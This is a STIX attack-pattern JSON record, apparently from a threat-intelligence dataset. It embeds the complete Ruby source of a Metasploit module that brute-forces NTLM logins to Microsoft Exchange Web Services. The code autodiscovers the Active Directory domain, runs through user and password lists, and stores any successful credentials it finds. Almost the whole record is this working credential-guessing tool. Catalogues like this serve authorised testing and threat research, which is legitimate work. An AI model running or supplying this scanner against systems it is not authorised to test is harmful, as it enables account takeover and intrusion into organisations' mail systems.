{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03ffc459-9097-4adc-ae1f-3d13a6527477",
    "created": "2024-08-14T16:29:50.611242Z",
    "modified": "2024-08-14T16:29:50.611246Z",
    "name": "OWA Exchange Web Services (EWS) Login Scanner",
    "description": " This module attempts to log in to the Exchange Web Services, often exposed at https://example.com/ews/, using NTLM authentication. This method is faster and simpler than traditional form-based logins.  In most cases, all you need to set is RHOSTS and some combination of user/pass files; the autodiscovery should find the location of the NTLM authentication point as well as the AD domain, and use them accordingly. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/owa_ews_login.rb",
            "external_id": "owa_ews_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'OWA Exchange Web Services (EWS) Login Scanner',\n      'Description'    => %q{\n        This module attempts to log in to the Exchange Web Services, often\n        exposed at https://example.com/ews/, using NTLM authentication. This\n        method is faster and simpler than traditional form-based logins.\n\n        In most cases, all you need to set is RHOSTS and some combination of\n        user/pass files; the autodiscovery should find the location of the NTLM\n        authentication point as well as the AD domain, and use them accordingly.\n      },\n      'Author'         => 'Rich Whitcroft',\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false }\n    )\n\n    register_options(\n      [\n        OptBool.new('AUTODISCOVER', [ false, \"Automatically discover domain URI\", true ]),\n        OptString.new('AD_DOMAIN', [ false, \"The Active Directory domain name\", nil ]),\n        OptString.new('TARGETURI', [ false, \"The location of the NTLM service\", nil ]),\n        Opt::RPORT(443)\n      ])\n  end\n\n  def run_host(ip)\n    cli = Rex::Proto::Http::Client.new(datastore['RHOSTS'], datastore['RPORT'], {}, datastore['SSL'], datastore['SSLVersion'], nil, '', '')\n    cli.set_config({ 'preferred_auth' => 'NTLM' })\n    cli.connect\n\n    domain = nil\n    uri = nil\n\n    if datastore['AUTODISCOVER']\n      domain, uri = autodiscover(cli)\n      if domain && uri\n        print_good(\"Found NTLM service at #{uri} for domain #{domain}.\")\n      else\n        print_error(\"Failed to autodiscover - try manually\")\n        return\n      end\n    elsif datastore['AD_DOMAIN'] && datastore['TARGETURI']\n      domain = datastore['AD_DOMAIN']\n      uri = datastore['TARGETURI']\n      uri << \"/\" unless uri.chars.last == \"/\"\n    else\n      print_error(\"You must set AD_DOMAIN and TARGETURI if not using autodiscover.\")\n      return\n    end\n\n    cli.set_config({ 'domain' => domain })\n\n    cred_collection = build_credential_collection(\n      realm: datastore['DOMAIN'],\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    cred_collection.each do |cred|\n      begin\n        req = cli.request_raw({\n          'uri' => uri,\n          'method' => 'GET',\n          'username' => cred.public,\n          'password' => cred.private\n        })\n\n        res = cli.send_recv(req)\n      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n        print_error(\"Connection failed\")\n        next\n      end\n\n      if res.code != 401\n        print_brute :level => :good, :ip => ip, :msg => \"Successful login: #{cred.to_s}\"\n        report_cred(\n          ip: ip,\n          port: datastore['RPORT'],\n          service_name: 'owa_ews',\n          user: cred.public,\n          password: cred.private\n        )\n\n        return if datastore['STOP_ON_SUCCESS']\n      else\n        vprint_brute :level => :verror, :ip => ip, :msg => \"Failed login: #{cred.to_s}\"\n      end\n    end\n  end\n\n  def autodiscover(cli)\n    uris = %w[ /ews/ /rpc/ /public/ ]\n    uris.each do |uri|\n      begin\n        req = cli.request_raw({\n          'encode'   => true,\n          'uri'      => uri,\n          'method'   => 'GET',\n          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}\n        })\n\n        res = cli.send_recv(req)\n      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n        print_error(\"HTTP Connection Failed\")\n        next\n      end\n\n      unless res\n        print_error(\"HTTP Connection Timeout\")\n        next\n      end\n\n      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)\n        hash = res['WWW-Authenticate'].split('NTLM ')[1]\n        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\\0/,'')\n        return domain, uri\n      end\n    end\n\n    return nil, nil\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}